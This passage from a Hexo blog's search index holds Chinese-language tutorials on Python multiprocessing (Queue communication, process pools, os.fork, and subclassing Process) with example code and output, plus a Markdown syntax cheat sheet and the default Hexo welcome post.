阻塞：遇到IO就发生阻塞，程序一旦遇到阻塞操作就会停在原地，并且立刻释放CPU资源 非阻塞（就绪态或运行态）：没有遇到IO操作，或者通过某种手段让程序即便是遇到IO操作也不会停在原地，执行其他操作，力求尽可能多的占有CPU pool.apply 和 pool.apply_async 的区别 apply ：阻塞式，需要等待当前子进程执行完毕后，在执行下一个子进程，耗时长。 apply_async ： 非阻塞式，async是异步的意思，不用等待当前运行的子进程执行完毕，随时根据系统调度来进行进程切换，耗时短。 进程间通信QueueProcess之间有时需要通信，操作系统提供了很多机制来实现进程间的通信。multiprocessing模块的Queue实现多进程之间的数据传递，Queue本身是一个消息列队程序 Queue的使用在内存中开辟一个队列模型，用来存放消息，任何拥有队列对象的进程都可以进行消息存放和取出 初始化Queue()对象时（例如：q=Queue()），若括号中没有指定最大可接收的消息数量，或数量为负值，那么就代表可接受的消息数量没有上限（直到内存的尽头）； Queue.qsize()：返回当前队列包含的消息数量； Queue.empty()：如果队列为空，返回True，反之False ； Queue.full()：如果队列满了，返回True,反之False； Queue.get([block[,timeout]]):获取队列中的一条消息，然后将其从列队中移除，block默认值为True； 1)如果block使用默认值，且没有设置timeout（单位秒），消息列队如果为空，此时程序将被阻塞（停在读取状态），直到从消息列队读到消息为止，如果设置了timeout，则会等待timeout秒，若还没读取到任何消息，则抛出”Queue.Empty”异常； （如 Queue.get(block=True,timeout=2)） 2）如果block值为False，消息列队如果为空，则会立刻抛出”Queue.Empty”异常； Queue.put(item,[block[, timeout]])：将item消息写入队列，block默认值为True； 1）如果block使用默认值，且没有设置timeout（单位秒），消息列队如果已经没有空间可写入，此时程序将被阻塞（停在写入状态），直到从消息列队腾出空间为止，如果设置了timeout，则会等待timeout秒，若还没空间，则抛出”Queue.Full”异常；（如 Queue.put(‘xxx’block=True,timeout=2)） 2）如果block值为False，消息列队如果没有空间可写入，则会立刻抛出”Queue.Full”异常； Queue.get_nowait()：相当Queue.get(False)； Queue.put_nowait(item)：相当Queue.put(item, False)； Queue实例在父进程中创建两个子进程，一个往Queue里写数据，一个从Queue里读数据： 1234567891011121314151617181920212223242526272829303132from multiprocessing import Process, Queueimport os, timedef write_data(queue): for value in ['Message1', 'Message2', 'Message3']: print("Put %s to queue..." %value) queue.put(value) # 加入消息队列 time.sleep(2)def read_data(queue): while True: if not queue.empty(): # 判断消息队列是否为空 value = queue.get(True) # 默认值为True，获取消息队列中的一个值 print("Get %s to queue..." %value) time.sleep(2) else: breakif __name__ == '__main__': # 当前父进程创建Queue,供两个子进程读写 q = Queue() # 初始化队列 ，未传入参数时，即可不受限制接受消息 pw = Process(target=write_data, args=(q,)) # 创建写进程 pr = Process(target=read_data, args=(q,)) # 创建读进程 # 写进程pw开启 pw.start() # 等待写进程pw结束 pw.join() # 读进程pr开启 pr.start() # 等待度进程pr结束 pr.join() print("...Done") 执行结果： 1234567Put Message1 to queue...Put Message2 to queue...Put Message3 to queue...Get Message1 to queue...Get Message2 to queue...Get Message3 to queue......Done 进程池通信Queue如果要使用Pool创建进程，就需要使用multiprocessing.Manager()中的Queue()，而不是multiprocessing.Queue()，否则会得到一条如下的错误信息： RuntimeError: Queue objects should only be shared between processes through inheritance. 下面的实例演示了进程池中的进程如何通信： 123456789101112131415161718192021222324from multiprocessing import Manager, Poolimport os, timedef reader(queue): print("reader启动(%s),父进程为(%s)"%(os.getpid(),os.getppid())) for i in range(queue.qsize()): print("reader从Queue获取到消息：%s "% queue.get(True)) def writer(queue): print("writer启动(%s),父进程为(%s)"%(os.getpid(),os.getppid())) for i in ['Message1', 'Message2', 'Message3', 'Message4']: queue.put(i)if __name__ == '__main__': print("(%s) start"%os.getpid()) q = Manager().Queue() #使用Manager中的Queue来初始化 po = Pool() #使用阻塞模式创建进程，这样就不需要在reader中使用死循环了，可以让writer完全执行完成后，再用reader去读取 po.apply(writer,(q,)) po.apply(reader,(q,)) po.close() po.join() print("(%s) End"%os.getpid()) 执行结果： 12345678(12196) startwriter启动(6812),父进程为(12196)reader启动(7992),父进程为(12196)reader从Queue获取到消息：Message1reader从Queue获取到消息：Message2reader从Queue获取到消息：Message3reader从Queue获取到消息：Message4(12196) End]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python创建进程的三种方式]]></title>
    <url>%2F2019%2F07%2F09%2FPython%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[python创建进程的三种方式 fork创建 multiprocessing 模块 Process类 继承Process类, 子类创建 1.fork创建os.fork方法会创建出一个子进程，原进程（父进程）返回一个大于零的值（即ret &gt; 0），这个值恰好是子进程的pid；而创建的新的子进程返回的值为零（即ret = 0）fork方法创建进程不适用于window系统，window系统中没有这个系统调用 1234567891011import osret = os.fork() if ret == 0: #子进程 print("Sub process pid = %d, Sub process ppid = %d" % (os.getpid(), os.getppid()))else: #父进程 print("Parent Process ret = %d" % ret) print("Parent Process pid = %d" % os.getpid()) 执行效果: 123Parent Process ret = 2757Parent Process pid = 2756Sub process pid = 2757, Sub process ppid = 2756 2.multiprocessing 模块 Process类通过Multiprocessing模块中的Process类,创建Process对象,target参数传入的是子进程执行的函数戴码, 通过start方法开启子进程 123456789101112131415161718from multiprocessing import Processimport timeimport osdef test(): time.sleep(2) print('子进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) if __name__ == '__main__': p = Process(target=test) p.start() p.join(3) # （堵塞）等待子进程结束，再执行父进程 join(timout) 超时时间 # 传入 1s 父进程等待1s，若超过1秒，子进程未结束，父进程先运行 # 传入3s 等待时间未结束，子进程结束，父进程运行 # 如果没有传入参数 父进程只有等待子进程结束，再运行 print('父进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) 注:fork方法创建的进程，主进程不会等待子进程结束再结束Process类创建的进程，默认情况主进程会等待子进程都结束，再结束 3.继承Process类, 子类创建创建一个子类, 继承Process类, 重写run方法, 实例出一个对象, 调用start方法运行子进程,调用start方法，会自动调用run方法 1234567891011121314151617from multiprocessing import Processimport timeimport osclass NewProcess(Process): #继承Process类 def run(self): # 重写run方法 while True: print('子进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) time.sleep(1)if __name__ == '__main__': p = NewProcess() # 实例化一个子进程对象 p.start() # 运行子进程的代码(即run方法) while True: print('父进程Process (pid:&#123;&#125;) starting...'.format(os.getpid())) time.sleep(1)]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的第一篇博客]]></title>
    <url>%2F2019%2F06%2F30%2F%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[这是我的第一篇博客 Markdown常用的语法 Markdown常用语法1.标题 1234567语法:# 一级标题## 二级标题### 三级标题#### 四级级标题##### 五级标题###### 六级标题 2.字体 1加粗: *字体* 效果: 字体 1斜体: **字体** 效果: 字体 1斜体加粗: ***字体*** 效果: 字体 1删除线: ~~字体~~ 效果: 字体 3.代码格式 编程语言可以更换格式: 效果： 1print("hello,world~"); 4.插入图片 在根目录sourse文件夹里创建一个images文件夹, 将图片放在 source/images/ 下 1格式: ![image](/images/xxx.jpg) 效果如下: 5.引用 在引用的文字前加&gt;，可以无限加… 1引用: &gt; 效果: 引用 引用 引用 引用 6.分割线 三个或者三个以上的 - 或者 * 都可以 1格式: ---或*** 7.超链接 12格式:[超链接名](超链接地址 "超链接title") 效果:百度淘宝 8.列表 1234无序列表: * 这是一个列表 + 这是一个列表 - 这是一个列表 效果: 这是一个列表 这是一个列表 这是一个列表 12345有序列表: 1. 这是一个列表 2. 这是一个列表 3. 这是一个列表 4. 这是一个列表 效果: 这是一个列表 这是一个列表 这是一个列表 这是一个列表 9.表格 表格内容对齐方式: -： 左对齐:-: ： 居中对齐-: ： 右对齐 123456格式: 表头1 | 表头2 | 表头3 | 表头4 - | :- | :-: | -: | 默认左对齐|左对齐|居中对齐|右对齐 默认左对齐|左对齐|居中对齐|右对齐 默认左对齐|左对齐|居中对齐|右对齐 效果: 表头1 表头2 表头3 表头4 默认左对齐 左对齐 居中对齐 右对齐 默认左对齐 左对齐 居中对齐 右对齐 默认左对齐 左对齐 居中对齐 右对齐 10.全文阅读在文章要不显示的部分前，添加以下内容 1格式: &lt;!-- more --&gt; markdown语法进阶1.字体、大小、颜色123456789语法:&lt;font face=&quot;黑体&quot;&gt;我是黑体字&lt;/font&gt; &lt;font face=&quot;微软雅黑&quot;&gt;我是微软雅黑&lt;/font&gt; &lt;font face=&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;/font&gt; &lt;font color=red&gt;我是红色&lt;/font&gt; &lt;font color=#008000&gt;我是绿色&lt;/font&gt; &lt;font color=Blue&gt;我是蓝色&lt;/font&gt; &lt;font size=5&gt;我是尺寸&lt;/font&gt; &lt;font face=&quot;黑体&quot; color=green size=5&gt;我是黑体，绿色，尺寸为5&lt;/font&gt; 我是黑体字我是微软雅黑我是华文彩云我是红色我是绿色我是蓝色我是尺寸我是黑体，绿色，尺寸为5 2.文字背景1&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;文字背景&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 文字背景]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>导航</tag>
        <tag>分享</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F06%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
